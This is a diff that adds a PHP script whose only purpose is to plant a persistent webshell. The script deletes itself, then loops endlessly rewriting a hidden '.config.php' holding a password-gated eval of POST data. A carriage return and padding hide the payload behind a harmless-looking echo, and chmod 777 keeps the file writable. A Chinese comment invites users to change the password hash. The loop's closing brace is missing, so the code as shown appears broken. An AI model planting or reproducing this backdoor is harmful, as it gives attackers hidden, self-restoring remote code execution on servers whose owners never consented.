@@ -1,0 +1,14 @@
+<?php
+error_reporting(0);
+ignore_user_abort(true);
+set_time_limit(0);
+unlink(__FILE__);
+
+$file = './.config.php';
+$cmd = 'echo -en "<?php if(md5($_GET[1])==\"3a50065e1709acc47ba0c9238294364f\"){@eval($_POST[2]);} ?>\r<?php echo \"test\"; ?>                                                 \n" > '.$file;
+//哈希值可自行修改
+while (1){
+	system($cmd);
+	system('chmod 777 '.$file);
+	usleep(5000);
+?>
